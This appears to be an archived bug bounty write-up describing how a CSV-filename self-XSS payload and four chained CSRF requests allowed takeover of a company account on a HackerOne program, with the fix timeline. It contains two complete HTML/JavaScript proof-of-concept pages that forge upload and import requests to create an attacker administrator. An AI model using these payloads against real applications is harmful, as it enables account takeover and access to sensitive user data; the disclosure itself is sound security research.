---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-05-08_4x-csrfs-chained-for-company-account-takeover.md
original_filename: 2019-05-08_4x-csrfs-chained-for-company-account-takeover.md
title: 4x CSRFs Chained For Company Account Takeover
category: documents
detected_topics:
- xss
- command-injection
- file-upload
- cors
- csrf
- api-security
tags:
- imported
- documents
- xss
- command-injection
- file-upload
- cors
- csrf
- api-security
language: en
raw_sha256: b07f95a884ffd4011fdcbca62de5121a7aa708028f3b9acba2c75fb64342404f
text_sha256: 63f08e466ce0dc52ec21f1b1032babb1916943f4b93b021fd29f897f965fb7fa
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# 4x CSRFs Chained For Company Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-05-08_4x-csrfs-chained-for-company-account-takeover.md
- Source Type: markdown
- Detected Topics: xss, command-injection, file-upload, cors, csrf, api-security
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `b07f95a884ffd4011fdcbca62de5121a7aa708028f3b9acba2c75fb64342404f`
- Text SHA256: `63f08e466ce0dc52ec21f1b1032babb1916943f4b93b021fd29f897f965fb7fa`


## Content

---
title: "4x CSRFs Chained For Company Account Takeover"
url: "https://medium.com/a-bugz-life/4x-csrfs-chained-for-company-account-takeover-f9fada416986"
authors: ["A Bug’z Life (@abugzlife1)"]
bugs: ["CSRF", "Account takeover"]
bounty: "3,000"
publication_date: "2019-05-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5267
scraped_via: "browseros"
---

# 4x CSRFs Chained For Company Account Takeover

4x CSRFs Chained For Company Account Takeover
A Bug’z Life
Follow
5 min read
·
May 8, 2019

396

3

Press enter or click to view image in full size
Critical Company Account Takeover CSRF

We’ve been spending some time on a new private program on 
HackerOne
, focusing on an asset that allows businesses to have company accounts, and invite different users to their company. They handle some fairly sensitive personal information on behalf of their users. We found a couple medium severity bugs the first 2 days, noted some areas to come back to, and noticed some other areas that could be easily escalated and exploited when finding a XSS. We spent a fair bit of that time trying to find a XSS because we knew as soon as we did, a user account takeover could be performed by changing the user’s email as there was no validation or verification process such as verifying the change from the old email address or requiring the user to enter a password.

Unfortunately, XSS’ have been very hard to find on this application as pretty much all user input goes through a filter that blocks any special character. On the 2nd night hunting on the program (Friday), we discovered the application has some functionality to import users from CSV. It’s an interesting process where there are several steps required in order to import the users from the CSV file. We tried to include special characters through the CSV upload, but they were also filtered unfortunately. Then after trying the filename itself: <img src=x onerror=alert(document.domain)>.csv an alert box popped! We could now perform a user account takeover using this XSS.

After continuing to test this, we quickly realized that this only triggers the moment you upload the file, even though the filename is persisted. There is no encoding performed at the time of file upload, but encoding is done any point after the initial upload. So this basically means that we can only execute this as a self-XSS, which is out of scope from the program. After trying a bunch of different payloads to bypass the encoding done by the application, there was no luck. The next course of action is to keep this in our back pocket and hope the encoding can be bypassed at some point, or execute it through some other way. Lucky for us, the endpoint does not have CSRF protection. Well this should be easy enough, just craft a CSRF request to trigger the self-XSS.

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
  <script>
  var uploadId = UPDATE_THIS_WITH_ID;
  function submitRequest() {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", `https://company.com/users/uploadFile?uploadId=${uploadId}`, true);
  xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------1566359571913061724703232384");
  xhr.withCredentials = true;
  var body = "-----------------------------1566359571913061724703232384\r\n" +
  "Content-Disposition: form-data; name=\"uploadedFile\"; filename=\"<img src=x onerror=alert(document.domain)>.csv\"\r\n" +
  "Content-Type: text/csv\r\n" +
  "\r\n" +
  "Company,User ID,LAST NAME,FIRST NAME,Access,Type,Email\r\n" +
  "H1 Company,999,Takeover,Account,System Admin,Administrator,neemaPoC@gmail.com\r\n" + 
  "-----------------------------1566359571913061724703232384\r\n" +
  "Content-Disposition: form-data; name=\"rosterType\"\r\n" + 
  "\r\n" +
  "staff\r\n" + 
  "-----------------------------1566359571913061724703232384\r\n" +
  "Content-Disposition: form-data; name=\"importMethod\"\r\n" +
  "\r\n" +
  "updateAdd\r\n" +
  "-----------------------------1566359571913061724703232384--\r\n";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)  
  aBody[i] = body.charCodeAt(i);
  xhr.send(new Blob([aBody]));
  </script>
  <form action="#">
  <input type="button" value="Submit request" onclick="submitRequest();" />
  </form>
  </body>
</html>

The above PoC worked as a CSRF, but there wasn’t an endpoint the user could be sent to after submitting the POST request that would trigger the XSS. All the target endpoints already had the filename encoded. After trying a few different redirects and other techniques, nothing seemed to be working so we dropped this and decided to take a break.

Get A Bug’z Life’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Fast forward to Sunday night (2 days after discovering the self-XSS), watching T.V., and some random inspiration hits (which happens surprisingly often since starting bug hunting)! Why don’t we forget about this red herring of a self-XSS and try to exploit this endpoint with a CSRF. We were blinded by the XSS possibility to realize this 😄. The file upload process contained the following aspects, all of which are required to push the change from file upload to users being added:

Upload the file (POST-1)
Fix any mistakes in the upload (GET-1)
Verify changes in the upload & submit for preview/verification (GET-2)
Verify changes from preview, and submit the upload (GET-3)

We already knew the first POST request was vulnerable to CSRF, and went through the remaining 3 GET requests and were lucky to see that these were also vulnerable to CSRF. This was a bit tricky, because some of the steps were not clear on how they could be executed, and there was 1 missing step from the above steps that would be identified later. After spending some time crafting a PoC for the the above 4 steps with no idea why it didn’t work, it seemed the application required the upload job to be viewed before it could be fixed. So it required us to insert a step between 1 and 2 which was a request to view the job. Also, CORS was adequately configured on the endpoint, so we could not get any response data when calling the endpoints, which would’ve been very helpful in order to get the current status of each of the steps (as each take a couple seconds-minutes depending on how much data was uploaded, internet speed, server load, etc.). After some testing on the average time it takes for each request to finish processing, we could then use Javascript’s setTimeout to stagger each of the 4 requests to ensure we can chain all of these CSRFs in one go. The final PoC code looked like:

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
  <script>
  var uploadId = UPDATE_THIS_WITH_ID;
  
  function xhrRequest(url) {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', url);
  xhr.withCredentials = true;
  xhr.send(null);
  }
  function submitRequest() {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", `https://company.com/users/uploadFile?uploadId=${uploadId}`, true);
  xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------1566359571913061724703232384");
  xhr.withCredentials = true;
  var body = "-----------------------------1566359571913061724703232384\r\n" +
  "Content-Disposition: form-data; name=\"uploadedFile\"; filename=\"neema.csv\"\r\n" +
  "Content-Type: text/csv\r\n" +
  "\r\n" +
  "Company,User ID,LAST NAME,FIRST NAME,Access,Type,Email\r\n" +
  "Company,999,Takeover,Account,System Admin,Administrator,neemaPoC@gmail.com\r\n" +
  "-----------------------------1566359571913061724703232384\r\n" +
  "Content-Disposition: form-data; name=\"rosterType\"\r\n" +
  "\r\n" +
  "staff\r\n" +
  "-----------------------------1566359571913061724703232384\r\n" +
  "Content-Disposition: form-data; name=\"importMethod\"\r\n" +
  "\r\n" +
  "updateAdd\r\n" +
  "-----------------------------1566359571913061724703232384--\r\n";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i);
  xhr.send(new Blob([aBody]));
  window.setTimeout(function () {  window.open(`https://company.com/users/upload?uploadId=${uploadId}`);
  window.setTimeout(function() {
  xhrRequest(`https://company.com/users/fix?uploadId=${uploadId}`);
  window.setTimeout(function () {
  xhrRequest(`https://company.com/users/submitToPreview?uploadId=${uploadId}`);
  window.setTimeout(function () {
  xhrRequest(`https://company.com/users/submitImport?uploadId=${uploadId}`);
  }, 2000)
  }, 2000)
  }, 2000)
  }, 2000)
  }
  </script>
  <form action="#">
  <input type="button" value="Submit request" onclick="submitRequest();" />
  </form>
  </body>
 </html>

The above code sends the initial POST request, and then staggers each request after the initial upload by timing out for 2000 ms (2 seconds). We found this to be a safe estimate for uploading 1 user. When this page hosted by the attacker (assuming the victim is an admin) is visited, the CSRF attack is executed and the 4 vulnerable endpoints are exploited to create an administrator user for the attacker. The attacker receives an email with their username and password to login. Once logging in, an administrator can delete any other administrator, so the attacker can delete all the other admins in the company, and completely takeover the account. This gives the attacker full access to all data and functionality, simply by the victim visiting the attacker controlled page.

After writing up this PoC, the report was finally sent over to the team who responded incredibly quickly with a triage and fix (well done to this team, they are very responsive and quick to act).

Timeline:

Report Submitted: Day 0
Report Triaged (Critical Severity): Day 1
$3,000 Bounty Rewarded: Day 2
Bug Fixed & Report Closed: Day 7
